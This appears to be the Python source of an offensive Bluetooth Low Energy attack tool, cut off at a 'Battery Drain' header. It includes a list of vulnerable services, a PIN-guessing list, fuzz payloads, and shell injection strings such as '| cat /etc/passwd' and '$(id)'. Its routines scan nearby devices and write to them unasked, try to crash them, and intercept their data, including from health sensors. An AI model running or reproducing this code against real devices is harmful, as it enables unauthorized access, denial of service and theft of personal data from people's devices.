import asyncio
import time
import subprocess
import struct
import uuid as uuid_lib
import random
from bleak import BleakScanner, BleakClient
from typing import List, Dict, Optional

# --- Constants ---

# Vulnerable service UUIDs with metadata
VULNERABLE_SERVICES = {
    # Serial / UART services
    "0000ffe0-0000-1000-8000-00805f9b34fb": {"name": "HM-10 Generic", "risk": "HIGH"},
    "0000ffe5-0000-1000-8000-00805f9b34fb": {"name": "HM-10 Custom / Serial (FFE5)", "risk": "HIGH"},
    "6e400001-b5a3-f393-e0a9-e50e24dcca9e": {"name": "Nordic UART", "risk": "HIGH"},
    "49535343-fe7d-4ae5-8fa9-9fafd205e455": {"name": "Microchip Transparent UART", "risk": "HIGH"},
    "0000fff0-0000-1000-8000-00805f9b34fb": {"name": "Custom Serial (FFF0)", "risk": "HIGH"},
    "0000fee7-0000-1000-8000-00805f9b34fb": {"name": "Tencent IoT", "risk": "MEDIUM"},
    # Firmware / OTA update services
    "0000fe59-0000-1000-8000-00805f9b34fb": {"name": "Nordic DFU (Buttonless)", "risk": "CRITICAL"},
    "00001530-1212-efde-1523-785feabcd123": {"name": "Nordic Legacy DFU", "risk": "CRITICAL"},
    "0000fe20-cc7a-482a-984a-7f2ed5b3e58f": {"name": "STMicro OTA", "risk": "CRITICAL"},
    "1d14d6ee-fd63-4fa1-bfa4-8f47b42119f0": {"name": "Silicon Labs OTA", "risk": "CRITICAL"},
    "f000ffc0-0451-4000-b000-000000000000": {"name": "TI OAD", "risk": "CRITICAL"},
    # ESP32
    "000000ff-0000-1000-8000-00805f9b34fb": {"name": "ESP32 Custom", "risk": "MEDIUM"},
    # Generic Access
    "00001800-0000-1000-8000-00805f9b34fb": {"name": "Generic Access", "risk": "LOW"},
    "00001801-0000-1000-8000-00805f9b34fb": {"name": "Generic Attribute", "risk": "LOW"},
    # Heart Rate / Health (data leak risk)
    "0000180d-0000-1000-8000-00805f9b34fb": {"name": "Heart Rate Service", "risk": "MEDIUM"},
    "00001810-0000-1000-8000-00805f9b34fb": {"name": "Blood Pressure", "risk": "MEDIUM"},
    "00001809-0000-1000-8000-00805f9b34fb": {"name": "Health Thermometer", "risk": "MEDIUM"},
}

# Common weak PINs for brute-force
COMMON_PINS = [
    # Default / factory PINs (4-digit)
    "0000", "1234", "1111", "0123", "4321", "1122",
    "9999", "8888", "5555", "6969", "1212", "7777",
    # Sequential
    "0001", "0002", "0010", "0100", "1000", "2345", "3456", "4567",
    "5678", "6789", "7890",
    # Repeated
    "2222", "3333", "4444", "6666",
    # Pattern-based
    "1357", "2468", "1379", "2580", "8520", "9630",
    "1313", "2424", "1010", "2020",
    # Year-based
    "2000", "2001", "2010", "2015", "2020", "2021", "2022", "2023", "2024",
    # 6-digit PINs
    "000000", "123456", "111111", "654321", "888888", "999999",
]

# Fuzz payloads: (bytes, name, description)
FUZZ_PAYLOADS = [
    # Buffer overflow
    (b"\x00" * 100, "null_100", "100 null bytes"),
    (b"\xFF" * 100, "ff_100", "100 xFF bytes"),
    (b"A" * 500, "ascii_500", "500 byte ASCII overflow"),
    (b"A" * 1000, "ascii_1k", "1KB ASCII overflow"),
    (b"A" * 2000, "ascii_2k", "2KB ASCII overflow"),
    # Boundary values
    (bytes(range(256))[:20], "sequential_20", "Sequential 0x00-0x13"),
    (bytes(range(255, -1, -1))[:20], "reverse_20", "Reverse 0xFF-0xEC"),
    (b"\x00", "single_null", "Single null byte"),
    (b"\xFF" * 20, "max_20", "20 xFF bytes (ATT max)"),
    # Format string
    (b"%s%s%s%s%s%s%s%s", "fmt_string_s", "Format string %s"),
    (b"%x%x%x%x%x%x%x%x", "fmt_string_x", "Format string %x"),
    # Integer overflow
    (b"\xFF\xFF\xFF\xFF", "int_overflow", "32-bit max unsigned"),
    (b"\x80\x00\x00\x00", "int_signed_min", "32-bit signed min"),
    # Edge cases
    (b"", "empty", "Empty payload"),
    (b"';DROP TABLE--", "sql_inject", "SQL injection pattern"),
]

# Command injection payloads: (bytes, name, category)
INJECTION_PAYLOADS = [
    # Unix shell
    (b"; ls", "ls", "unix"),
    (b"| cat /etc/passwd", "cat_passwd", "unix"),
    (b"`whoami`", "whoami_backtick", "unix"),
    (b"$(id)", "id_subshell", "unix"),
    (b"; uname -a", "uname", "unix"),
    (b"| id", "id_pipe", "unix"),
    (b"\n/bin/sh", "binsh", "unix"),
    (b"; cat /proc/version", "proc_version", "unix"),
    # AT commands (modem / BLE modules)
    (b"AT+CMD", "at_cmd", "at"),
    (b"+++ATH0", "modem_escape", "at"),
    (b"AT+GMI\r\n", "at_gmi", "at"),
    (b"AT+CGMI\r\n", "at_cgmi", "at"),
    (b"AT+CGSN\r\n", "at_cgsn", "at"),
    (b"ATI\r\n", "at_info", "at"),
    # IoT / JSON
    (b'{"cmd":"reboot"}', "json_reboot", "iot"),
    (b'{"admin":true}', "json_admin", "iot"),
    (b'{"debug":1}', "json_debug", "iot"),
    # Path traversal
    (b"../../../etc/passwd", "path_traversal", "traversal"),
    # Null-byte bypass
    (b"admin\x00password", "null_bypass", "bypass"),
    # Overflow + command
    (b"A" * 64 + b"; id", "overflow_cmd", "combined"),
]

# Response indicators for command injection detection
RESPONSE_INDICATORS = {
    "root:":    {"confidence": "HIGH", "type": "unix_passwd"},
    "uid=":     {"confidence": "HIGH", "type": "unix_id"},
    "Linux":    {"confidence": "HIGH", "type": "uname"},
    "/bin/":    {"confidence": "HIGH", "type": "unix_path"},
    "OK":       {"confidence": "LOW", "type": "at_response"},
    "ERROR":    {"confidence": "LOW", "type": "at_error"},
    "#":        {"confidence": "MEDIUM", "type": "shell_root"},
    "$":        {"confidence": "MEDIUM", "type": "shell_user"},
    "busybox":  {"confidence": "HIGH", "type": "embedded_linux"},
    "version":  {"confidence": "MEDIUM", "type": "version_info"},
}

# Eddystone-URL scheme encodings
EDDYSTONE_URL_SCHEMES = {
    "http://www.": 0x00,
    "https://www.": 0x01,
    "http://": 0x02,
    "https://": 0x03,
}

EDDYSTONE_URL_SUFFIXES = {
    ".com/": 0x00, ".org/": 0x01, ".edu/": 0x02, ".net/": 0x03,
    ".info/": 0x04, ".biz/": 0x05, ".gov/": 0x06,
    ".com": 0x07, ".org": 0x08, ".edu": 0x09, ".net": 0x0A,
    ".info": 0x0B, ".biz": 0x0C, ".gov": 0x0D,
}


class BLEAttack:
    def __init__(self, state_dict, log_queue=None):
        """
        state_dict: Shared state dictionary
        Keys: 'attack_running', 'attack_result', 'attack_target', 'attack_type'
        log_queue: Optional queue for sending logs to frontend
        """
        self.state = state_dict
        self.current_attack = None
        self.log_queue = log_queue

    def log(self, message, log_type="attack"):
        """Send log message to queue if available"""
        if self.log_queue:
            self.log_queue.put({"type": log_type, "msg": message})
        print(message)

    # ------------------------------------------------------------------
    # HCI Helpers (for Beacon Spoof)
    # ------------------------------------------------------------------
    def _hci_check(self, iface="hci0"):
        """Check if HCI adapter is available"""
        try:
            r = subprocess.run(["hciconfig", iface], capture_output=True, text=True, timeout=5)
            return r.returncode == 0 and "UP" in r.stdout
        except Exception:
            return False

    def _hci_enable_adv(self, iface="hci0"):
        """Enable non-connectable undirected advertising"""
        try:
            subprocess.run(["hciconfig", iface, "up"], capture_output=True, timeout=5)
            r = subprocess.run(["hciconfig", iface, "leadv", "3"], capture_output=True, text=True, timeout=5)
            return r.returncode == 0
        except Exception:
            return False

    def _hci_disable_adv(self, iface="hci0"):
        """Disable advertising"""
        try:
            subprocess.run(["hciconfig", iface, "noleadv"], capture_output=True, timeout=5)
        except Exception:
            pass

    def _hci_set_adv_data(self, data_bytes, iface="hci0"):
        """Set advertising data via HCI command"""
        length = len(data_bytes)
        hex_data = [f"{b:02X}" for b in data_bytes]
        cmd = ["hcitool", "-i", iface, "cmd", "0x08", "0x0008", f"{length:02X}"] + hex_data
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
            return r.returncode == 0
        except Exception:
            return False

    # ------------------------------------------------------------------
    # Beacon Payload Builders
    # ------------------------------------------------------------------
    def _build_ibeacon(self, uuid_str, major=1, minor=1, tx_power=-59):
        """Build iBeacon advertising data (30 bytes)"""
        uuid_bytes = uuid_lib.UUID(uuid_str).bytes
        data = bytearray()
        data += b"\x02\x01\x06"           # Flags: LE General Discoverable + BR/EDR Not Supported
        data += b"\x1A\xFF\x4C\x00"       # Apple Manufacturer Specific
        data += b"\x02\x15"               # iBeacon type + length
        data += uuid_bytes                 # 16-byte UUID
        data += struct.pack(">H", major)   # Major (big-endian)
        data += struct.pack(">H", minor)   # Minor (big-endian)
        data += struct.pack("b", tx_power) # TX Power (signed)
        return bytes(data)

    def _build_eddystone_url(self, url):
        """Build Eddystone-URL advertising data"""
        scheme_byte = None
        url_body = url
        for scheme, code in EDDYSTONE_URL_SCHEMES.items():
            if url.startswith(scheme):
                scheme_byte = code
                url_body = url[len(scheme):]
                break
        if scheme_byte is None:
            scheme_byte = 0x03  # default https://
            url_body = url.replace("https://", "").replace("http://", "")

        # Encode URL suffixes
        encoded = bytearray()
        i = 0
        while i < len(url_body):
            matched = False
            for suffix, code in EDDYSTONE_URL_SUFFIXES.items():
                if url_body[i:].startswith(suffix):
                    encoded.append(code)
                    i += len(suffix)
                    matched = True
                    break
            if not matched:
                encoded.append(ord(url_body[i]))
                i += 1

        # Build advertising data
        svc_data_len = 6 + len(encoded)  # 16-bit UUID(2) + frame_type(1) + tx(1) + scheme(1) + encoded
        data = bytearray()
        data += b"\x02\x01\x06"                     # Flags
        data += b"\x03\x03\xAA\xFE"                 # Eddystone UUID
        data += bytes([svc_data_len, 0x16, 0xAA, 0xFE])  # Service Data header
        data += b"\x10"                              # Eddystone-URL frame
        data += bytes([0xF4 & 0xFF])                 # TX Power (-12 dBm as unsigned)
        data += bytes([scheme_byte])                 # URL scheme
        data += bytes(encoded)                       # URL body
        return bytes(data)

    def _build_name_adv(self, name):
        """Build advertising data with Complete Local Name"""
        name_bytes = name.encode("utf-8")[:29]  # Max 29 bytes (31 - 2 flags overhead)
        data = bytearray()
        data += b"\x02\x01\x06"                          # Flags
        data += bytes([len(name_bytes) + 1, 0x09])        # Complete Local Name AD type
        data += name_bytes
        return bytes(data)

    # ------------------------------------------------------------------
    # Attack 1: Auto-Connect Vulnerable
    # ------------------------------------------------------------------
    async def auto_connect_vulnerable(self):
        """Auto-connect to devices with vulnerable characteristics"""
        self.log("[BLE ATTACK] Starting Auto-Connect Vulnerable scan...")
        self.state["attack_running"] = True
        self.state["attack_result"] = {
            "status": "scanning",
            "vulnerable_devices": [],
            "message": "Scanning for vulnerable devices..."
        }

        try:
            self.log("[BLE ATTACK] Discovering nearby BLE devices...")
            devices = await BleakScanner.discover(timeout=10.0)
            self.log(f"[BLE ATTACK] Found {len(devices)} devices. Checking for vulnerabilities...")
            vulnerable = []

            for device in devices:
                if not self.state["attack_running"]:
                    break

                try:
                    async with BleakClient(device.address, timeout=8.0) as client:
                        if not self.state["attack_running"]:
                            break

                        if client.is_connected:
                            services = client.services
                            device_flagged = False

                            for service in services:
                                if not self.state["attack_running"]:
                                    break

                                svc_uuid = service.uuid.lower()

                                # Check known vulnerable services
                                if svc_uuid in VULNERABLE_SERVICES:
                                    svc_info = VULNERABLE_SERVICES[svc_uuid]
                                    vulnerable.append({
                                        "mac": device.address,
                                        "name": device.name or "Unknown",
                                        "service": service.uuid,
                                        "service_name": svc_info["name"],
                                        "risk": svc_info["risk"]
                                    })
                                    self.log(f"[!] VULNERABLE: {device.name or 'Unknown'} ({device.address}) - {svc_info['name']} [{svc_info['risk']}]")
                                    device_flagged = True
                                    break

                            # Probe unknown services for writable chars without auth
                            if not device_flagged and self.state["attack_running"]:
                                for service in services:
                                    if device_flagged or not self.state["attack_running"]:
                                        break
                                    for char in service.characteristics:
                                        if "write" in char.properties or "write-without-response" in char.properties:
                                            try:
                                                test_data = b"\x01"
                                                await client.write_gatt_char(char.uuid, test_data, response=("write" in char.properties))
                                                vulnerable.append({
                                                    "mac": device.address,
                                                    "name": device.name or "Unknown",
                                                    "service": service.uuid,
                                                    "service_name": "Unknown (writable)",
                                                    "risk": "MEDIUM",
                                                    "note": f"Writable without auth: {char.uuid}"
                                                })
                                                self.log(f"[!] WRITABLE: {device.name or 'Unknown'} ({device.address}) - char {char.uuid}")
                                                device_flagged = True
                                                break
                                            except Exception:
                                                pass

                            self.state["attack_result"]["vulnerable_devices"] = vulnerable
                            self.state["attack_result"]["count"] = len(vulnerable)

                except Exception:
                    continue

            if not self.state["attack_running"]:
                self.log(f"[BLE ATTACK] Attack stopped by user. Found {len(vulnerable)} vulnerable device(s).")
                self.state["attack_result"] = {
                    "status": "stopped",
                    "vulnerable_devices": vulnerable,
                    "count": len(vulnerable),
                    "message": f"Attack stopped. Found {len(vulnerable)} vulnerable device(s) before stopping."
                }
            else:
                self.log(f"[BLE ATTACK] Scan complete. Found {len(vulnerable)} vulnerable device(s).")
                self.state["attack_result"] = {
                    "status": "completed",
                    "vulnerable_devices": vulnerable,
                    "count": len(vulnerable),
                    "message": f"Found {len(vulnerable)} vulnerable device(s)"
                }

        except Exception as e:
            self.log(f"[BLE ATTACK] Scan failed: {str(e)}")
            self.state["attack_result"] = {
                "status": "failed",
                "error": str(e),
                "message": f"Scan failed: {str(e)}"
            }
        finally:
            self.state["attack_running"] = False

    # ------------------------------------------------------------------
    # Attack 2: PIN Brute-Force
    # ------------------------------------------------------------------
    async def brute_force_pin(self, mac: str):
        """Analyze pairing security and probe for PIN vulnerabilities"""
        self.log(f"[BLE ATTACK] Starting PIN security analysis on {mac}")
        self.state["attack_running"] = True
        self.state["attack_result"] = {
            "status": "running",
            "target": mac,
            "attempts": 0,
            "message": "Analyzing pairing security..."
        }

        findings = []
        attempts = 0

        try:
            # Phase 1: Try pairing to determine pairing type
            self.log("[BLE ATTACK] Phase 1: Pairing analysis...")
            self.state["attack_result"]["message"] = "Phase 1: Pairing analysis..."

            try:
                async with BleakClient(mac, timeout=8.0) as client:
                    if client.is_connected:
                        # Try to pair
                        try:
                            await client.pair()
                            findings.append({
                                "type": "pairing",
                                "result": "JustWorks",
                                "risk": "HIGH",
                                "detail": "Device paired with JustWorks (no PIN required)"
                            })
                            self.log("[!] JustWorks pairing succeeded - NO PIN REQUIRED")
                            try:
                                await client.unpair()
                            except Exception:
                                pass
                        except Exception as pair_err:
                            err_str = str(pair_err).lower()
                            if "authenticationfailed" in err_str or "authentication" in err_str:
                                findings.append({
                                    "type": "pairing",
                                    "result": "PIN/Passkey required",
                                    "risk": "MEDIUM",
                                    "detail": "Device requires PIN or passkey for pairing"
                                })
                                self.log("[BLE ATTACK] Device requires PIN/passkey for pairing")
                            elif "rejected" in err_str or "refused" in err_str:
                                findings.append({
                                    "type": "pairing",
                                    "result": "Pairing rejected",
                                    "risk": "LOW",
                                    "detail": "Device rejected pairing attempt"
                                })
                                self.log("[BLE ATTACK] Device rejected pairing")
                            else:
                                findings.append({
                                    "type": "pairing",
                                    "result": "Error",
                                    "risk": "INFO",
                                    "detail": f"Pairing error: {str(pair_err)[:100]}"
                                })
                                self.log(f"[BLE ATTACK] Pairing error: {str(pair_err)[:100]}")
            except Exception as conn_err:
                self.log(f"[BLE ATTACK] Connection failed for pairing: {str(conn_err)[:80]}")

            if not self.state["attack_running"]:
                self.state["attack_result"] = {
                    "status": "stopped", "target": mac,
                    "attempts": attempts, "findings": findings,
                    "message": f"Stopped. {len(findings)} finding(s)."
                }
                return

            # Phase 2: Probe protected characteristics without pairing
            self.log("[BLE ATTACK] Phase 2: Probing characteristics without pairing...")
            self.state["attack_result"]["message"] = "Phase 2: Probing characteristics..."

            try:
                async with BleakClient(mac, timeout=8.0) as client:
                    if client.is_connected:
                        services = client.services
                        for service in services:
                            if not self.state["attack_running"]:
                                break
                            for char in service.characteristics:
                                if not self.state["attack_running"]:
                                    break
                                attempts += 1
                                self.state["attack_result"]["attempts"] = attempts

                                # Try reading without pairing
                                if "read" in char.properties:
                                    try:
                                        data = await client.read_gatt_char(char.uuid)
                                        if data and len(data) > 0:
                                            findings.append({
                                                "type": "unprotected_read",
                                                "uuid": char.uuid,
                                                "risk": "HIGH",
                                                "detail": f"Readable without pairing ({len(data)} bytes)",
                                                "data_preview": data.hex()[:40]
                                            })
                                            self.log(f"[!] UNPROTECTED READ: {char.uuid} ({len(data)} bytes)")
                                    except Exception:
                                        pass

                                # Try writing without pairing
                                if "write" in char.properties or "write-without-response" in char.properties:
                                    try:
                                        test = b"\x00"
                                        await client.write_gatt_char(char.uuid, test, response=("write" in char.properties))
                                        findings.append({
                                            "type": "unprotected_write",
                                            "uuid": char.uuid,
                                            "risk": "HIGH",
                                            "detail": "Writable without pairing"
                                        })
                                        self.log(f"[!] UNPROTECTED WRITE: {char.uuid}")
                                    except Exception:
                                        pass
            except Exception as conn_err:
                self.log(f"[BLE ATTACK] Connection failed for probing: {str(conn_err)[:80]}")

            if not self.state["attack_running"]:
                self.state["attack_result"] = {
                    "status": "stopped", "target": mac,
                    "attempts": attempts, "findings": findings,
                    "message": f"Stopped after {attempts} probes. {len(findings)} finding(s)."
                }
                return

            # Phase 3: PIN list test (connect/pair/unpair cycle)
            self.log(f"[BLE ATTACK] Phase 3: Testing {len(COMMON_PINS)} common PINs...")
            self.state["attack_result"]["message"] = f"Phase 3: Testing {len(COMMON_PINS)} PINs..."

            for pin in COMMON_PINS:
                if not self.state["attack_running"]:
                    break

                attempts += 1
                self.state["attack_result"]["attempts"] = attempts
                self.state["attack_result"]["current_pin"] = pin

                try:
                    async with BleakClient(mac, timeout=5.0) as client:
                        if client.is_connected:
                            try:
                                await client.pair()
                                # If pair succeeds, device uses JustWorks (already found in Phase 1)
                                try:
                                    await client.unpair()
                                except Exception:
                                    pass
                                break
                            except Exception:
                                pass
                except Exception:
                    await asyncio.sleep(0.5)

            # Note: bleak cannot programmatically supply PIN digits to BlueZ
            # The PIN list test above detects JustWorks vs PIN-required
            pin_note = "Note: bleak/BlueZ does not expose Agent1 interface for programmatic PIN entry. " \
                       "PIN brute-force requires btmgmt or a custom BlueZ agent."

            if not self.state["attack_running"]:
                self.log(f"[BLE ATTACK] PIN analysis stopped after {attempts} attempts")
                self.state["attack_result"] = {
                    "status": "stopped",
                    "target": mac,
                    "attempts": attempts,
                    "findings": findings,
                    "note": pin_note,
                    "message": f"Stopped after {attempts} attempts. {len(findings)} finding(s)."
                }
            else:
                high_findings = sum(1 for f in findings if f.get("risk") == "HIGH")
                self.log(f"[BLE ATTACK] PIN analysis complete. {len(findings)} findings ({high_findings} HIGH)")
                self.state["attack_result"] = {
                    "status": "completed",
                    "target": mac,
                    "attempts": attempts,
                    "findings": findings,
                    "note": pin_note,
                    "message": f"Analysis complete: {len(findings)} finding(s), {high_findings} HIGH risk"
                }

        except Exception as e:
            self.log(f"[BLE ATTACK] PIN analysis failed: {str(e)}")
            self.state["attack_result"] = {
                "status": "failed",
                "error": str(e),
                "message": f"Attack failed: {str(e)}"
            }
        finally:
            self.state["attack_running"] = False

    # ------------------------------------------------------------------
    # Attack 3: Characteristic Fuzzing
    # ------------------------------------------------------------------
    async def characteristic_fuzzing(self, mac: str):
        """Fuzz device characteristics with crash detection"""
        self.log(f"[BLE ATTACK] Starting characteristic fuzzing on {mac}")
        self.state["attack_running"] = True
        self.state["attack_result"] = {
            "status": "running",
            "target": mac,
            "tested": 0,
            "crash_count": 0,
            "vulnerable": [],
            "message": "Fuzzing characteristics..."
        }

        crash_detected = False
        crash_event = asyncio.Event()

        def on_disconnect(client):
            nonlocal crash_detected
            crash_detected = True
            crash_event.set()

        vulnerable_chars = []
        tested = 0
        crash_count = 0

        try:
            client = BleakClient(mac, timeout=10.0, disconnected_callback=on_disconnect)
            await client.connect()

            if not client.is_connected:
                raise Exception("Could not connect to device")

            services = client.services

            for service in services:
                if not self.state["attack_running"]:
                    break

                for char in service.characteristics:
                    if not self.state["attack_running"]:
                        break

                    if "write" not in char.properties and "write-without-response" not in char.properties:
                        continue

                    tested += 1
                    self.state["attack_result"]["tested"] = tested
                    use_response = "write" in char.properties

                    for payload_bytes, payload_name, payload_desc in FUZZ_PAYLOADS:
                        if not self.state["attack_running"]:
                            break

                        crash_detected = False
                        crash_event.clear()

                        try:
                            if "write-without-response" in char.properties and not use_response:
                                await client.write_gatt_char(char.uuid, payload_bytes, response=False)
                            else:
                                await client.write_gatt_char(char.uuid, payload_bytes)

                            # Wait briefly to detect crash
                            try:
                                await asyncio.wait_for(crash_event.wait(), timeout=0.5)
                            except asyncio.TimeoutError:
                                pass

                            if crash_detected:
                                # CRASH: device disconnected after write
                                crash_count += 1
                                vulnerable_chars.append({
                                    "uuid": char.uuid,
                                    "service": service.uuid,
                                    "payload_name": payload_name,
                                    "payload_desc": payload_desc,
                                    "result": "CRASH",
                                    "risk": "HIGH"
                                })
                                self.log(f"[!] CRASH: {char.uuid} with {payload_name} ({payload_desc})")

                                self.state["attack_result"]["crash_count"] = crash_count
                                self.state["attack_result"]["vulnerable"] = vulnerable_chars

                                # Try to reconnect
                                await asyncio.sleep(2)
                                try:
                                    client = BleakClient(mac, timeout=10.0, disconnected_callback=on_disconnect)
                                    await client.connect()
                                    if not client.is_connected:
                                        self.log("[BLE ATTACK] Could not reconnect after crash, stopping fuzzing")
                                        break
                                    services = client.services
                                    self.log("[BLE ATTACK] Reconnected, continuing fuzzing...")
                                except Exception:
                                    self.log("[BLE ATTACK] Reconnection failed, stopping fuzzing")
                                    break
                            else:
                                # ACCEPTED: write succeeded, device still alive
                                vulnerable_chars.append({
                                    "uuid": char.uuid,
                                    "service": service.uuid,
                                    "payload_name": payload_name,
                                    "payload_desc": payload_desc,
                                    "result": "ACCEPTED",
                                    "risk": "LOW"
                                })

                        except Exception:
                            # REJECTED: device refused the write
                            pass

                        await asyncio.sleep(0.2)

            try:
                await client.disconnect()
            except Exception:
                pass

            if not self.state["attack_running"]:
                self.state["attack_result"] = {
                    "status": "stopped",
                    "target": mac,
                    "tested": tested,
                    "crash_count": crash_count,
                    "vulnerable": vulnerable_chars,
                    "message": f"Stopped. Tested {tested} chars, {crash_count} crashes, {len(vulnerable_chars)} findings."
                }
            else:
                self.state["attack_result"] = {
                    "status": "completed",
                    "target": mac,
                    "tested": tested,
                    "crash_count": crash_count,
                    "vulnerable": vulnerable_chars,
                    "message": f"Fuzzed {tested} chars: {crash_count} crash(es), {len(vulnerable_chars)} total findings"
                }

        except Exception as e:
            self.state["attack_result"] = {
                "status": "failed",
                "error": str(e),
                "message": f"Fuzzing failed: {str(e)}"
            }
        finally:
            self.state["attack_running"] = False

    # ------------------------------------------------------------------
    # Attack 4: Command Injection
    # ------------------------------------------------------------------
    async def command_injection_test(self, mac: str):
        """Test for command injection with response analysis"""
        self.log(f"[BLE ATTACK] Testing command injection on {mac}")
        self.state["attack_running"] = True
        self.state["attack_result"] = {
            "status": "running",
            "target": mac,
            "tested": 0,
            "vulnerable": [],
            "message": "Testing for command injection..."
        }

        vulnerable = []
        tested = 0
        notify_responses = {}

        def make_notify_handler(char_uuid):
            def handler(sender, data):
                if char_uuid not in notify_responses:
                    notify_responses[char_uuid] = []
                notify_responses[char_uuid].append({
                    "data": data,
                    "hex": data.hex(),
                    "timestamp": time.time()
                })
            return handler

        try:
            async with BleakClient(mac, timeout=10.0) as client:
                if not client.is_connected:
                    raise Exception("Could not connect to device")

                services = client.services
                subscribed_chars = set()

                # Subscribe to all notify characteristics first
                for service in services:
                    for char in service.characteristics:
                        if "notify" in char.properties:
                            try:
                                await client.start_notify(char.uuid, make_notify_handler(char.uuid))
                                subscribed_chars.add(char.uuid)
                            except Exception:
                                pass

                # Collect baseline responses (wait 1s)
                await asyncio.sleep(1.0)
                baseline = {k: len(v) for k, v in notify_responses.items()}

                # Test injection payloads on writable characteristics
                for service in services:
                    if not self.state["attack_running"]:
                        break

                    for char in service.characteristics:
                        if not self.state["attack_running"]:
                            break

                        if "write" not in char.properties and "write-without-response" not in char.properties:
                            continue

                        tested += 1
                        self.state["attack_result"]["tested"] = tested

                        for payload_bytes, payload_name, payload_cat in INJECTION_PAYLOADS:
                            if not self.state["attack_running"]:
                                break

                            # Clear notify counters for this round
                            pre_counts = {k: len(v) for k, v in notify_responses.items()}

                            try:
                                use_response = "write" in char.properties
                                await client.write_gatt_char(char.uuid, payload_bytes, response=use_response)
                                await asyncio.sleep(0.5)

                                # Check for responses via notify
                                for nchar_uuid, responses in notify_responses.items():
                                    new_count = len(responses) - pre_counts.get(nchar_uuid, 0)
                                    if new_count > 0:
                                        for resp in responses[-new_count:]:
                                            resp_data = resp["data"]
                                            resp_text = resp_data.decode("utf-8", errors="ignore")
                                            confidence = "LOW"

                                            # Check against known indicators
                                            for pattern, indicator in RESPONSE_INDICATORS.items():
                                                if pattern in resp_text:
                                                    confidence = indicator["confidence"]
                                                    break

                                            # Check if response differs from baseline
                                            if new_count > baseline.get(nchar_uuid, 0):
                                                if confidence == "LOW":
                                                    confidence = "MEDIUM"

                                            finding = {
                                                "uuid": char.uuid,
                                                "service": service.uuid,
                                                "payload": payload_name,
                                                "category": payload_cat,
                                                "response_char": nchar_uuid,
                                                "response": resp["hex"][:40],
                                                "response_text": resp_text[:60],
                                                "risk": confidence
                                            }
                                            vulnerable.append(finding)
                                            self.log(f"[!] INJECTION RESPONSE [{confidence}]: {payload_name} -> {resp_text[:40]}")

                                # Also try direct read response
                                if "read" in char.properties:
                                    try:
                                        response = await client.read_gatt_char(char.uuid)
                                        if response and len(response) > 0:
                                            resp_text = response.decode("utf-8", errors="ignore")
                                            confidence = "LOW"
                                            for pattern, indicator in RESPONSE_INDICATORS.items():
                                                if pattern in resp_text:
                                                    confidence = indicator["confidence"]
                                                    break
                                            vulnerable.append({
                                                "uuid": char.uuid,
                                                "service": service.uuid,
                                                "payload": payload_name,
                                                "category": payload_cat,
                                                "response": response.hex()[:40],
                                                "response_text": resp_text[:60],
                                                "risk": confidence
                                            })
                                            self.log(f"[!] INJECTION READ [{confidence}]: {payload_name} -> {resp_text[:40]}")
                                    except Exception:
                                        pass

                            except Exception:
                                pass

                            await asyncio.sleep(0.3)

                        self.state["attack_result"]["vulnerable"] = vulnerable

                if not self.state["attack_running"]:
                    self.state["attack_result"] = {
                        "status": "stopped",
                        "target": mac,
                        "tested": tested,
                        "vulnerable": vulnerable,
                        "message": f"Stopped. Tested {tested} chars, {len(vulnerable)} injection points."
                    }
                else:
                    high = sum(1 for v in vulnerable if v.get("risk") == "HIGH")
                    self.state["attack_result"] = {
                        "status": "completed",
                        "target": mac,
                        "tested": tested,
                        "vulnerable": vulnerable,
                        "message": f"Tested {tested} chars: {len(vulnerable)} responses ({high} HIGH confidence)"
                    }

        except Exception as e:
            self.state["attack_result"] = {
                "status": "failed",
                "error": str(e),
                "message": f"Test failed: {str(e)}"
            }
        finally:
            self.state["attack_running"] = False

    # ------------------------------------------------------------------
    # Attack 5: BLE Hijacking
    # ------------------------------------------------------------------
    async def hijack_connection(self, mac: str):
        """Hijack/intercept BLE connection with continuous monitoring"""
        self.log(f"[BLE ATTACK] Starting BLE hijacking on {mac}")
        self.state["attack_running"] = True
        self.state["attack_result"] = {
            "status": "running",
            "target": mac,
            "message": "Attempting connection hijacking..."
        }

        notification_count = 0
        start_time = time.time()

        try:
            self.log("[BLE ATTACK] Connecting to target device...")
            async with BleakClient(mac, timeout=10.0) as client:
                if not client.is_connected:
                    raise Exception("Could not connect to device")

                self.log(f"[BLE ATTACK] Connected to {mac}. Enumerating services...")

                services = client.services
                captured_data = []

                # Read all readable characteristics
                for service in services:
                    for char in service.characteristics:
                        char_info = {
                            "type": "characteristic",
                            "service": service.uuid,
                            "uuid": char.uuid,
                            "properties": char.properties,
                            "data": None
                        }

                        if "read" in char.properties:
                            try:
                                data = await client.read_gatt_char(char.uuid)
                                char_info["data"] = data.hex()
                                self.log(f"[+] Read {len(data)} bytes from {char.uuid}")
                            except Exception as e:
                                char_info["error"] = str(e)

                        captured_data.append(char_info)

                # Subscribe to all notify characteristics
                def make_handler(char_uuid):
                    def handler(sender, data):
                        nonlocal notification_count
                        notification_count += 1
                        captured_data.append({
                            "type": "notification",
                            "char": char_uuid,
                            "data": data.hex(),
                            "size": len(data),
                            "timestamp": time.time()
                        })
                        self.log(f"[+] Notification #{notification_count}: {len(data)} bytes from {char_uuid[:8]}...")
                    return handler

                for service in services:
                    for char in service.characteristics:
                        if "notify" in char.properties:
                            try:
                                await client.start_notify(char.uuid, make_handler(char.uuid))
                                self.log(f"[+] Subscribed to notifications on {char.uuid}")
                            except Exception:
                                pass

                # Continuous monitoring until STOP
                self.log("[BLE ATTACK] Monitoring traffic (press STOP to end)...")
                while self.state["attack_running"]:
                    elapsed = int(time.time() - start_time)
                    self.state["attack_result"] = {
                        "status": "running",
                        "target": mac,
                        "captured_characteristics": len(captured_data),
                        "notification_count": notification_count,
                        "monitoring_duration": elapsed,
                        "data": captured_data[-20:],
                        "message": f"Monitoring: {notification_count} notifications, {elapsed}s elapsed"
                    }
                    await asyncio.sleep(0.5)

                # Stopped
                elapsed = int(time.time() - start_time)
                self.log(f"[BLE ATTACK] Hijacking stopped. {len(captured_data)} items captured, {notification_count} notifications in {elapsed}s.")
                self.state["attack_result"] = {
                    "status": "stopped",
                    "target": mac,
                    "captured_characteristics": len(captured_data),
                    "notification_count": notification_count,
                    "monitoring_duration": elapsed,
                    "data": captured_data[-20:],
                    "message": f"Captured {len(captured_data)} items, {notification_count} notifications in {elapsed}s"
                }

        except Exception as e:
            self.log(f"[BLE ATTACK] Hijacking failed: {str(e)}")
            self.state["attack_result"] = {
                "status": "failed",
                "error": str(e),
                "message": f"Hijacking failed: {str(e)}"
            }
        finally:
            self.state["attack_running"] = False

    # ------------------------------------------------------------------
    # Attack 6: Battery Drain
    # ------------------------------------------------------------------
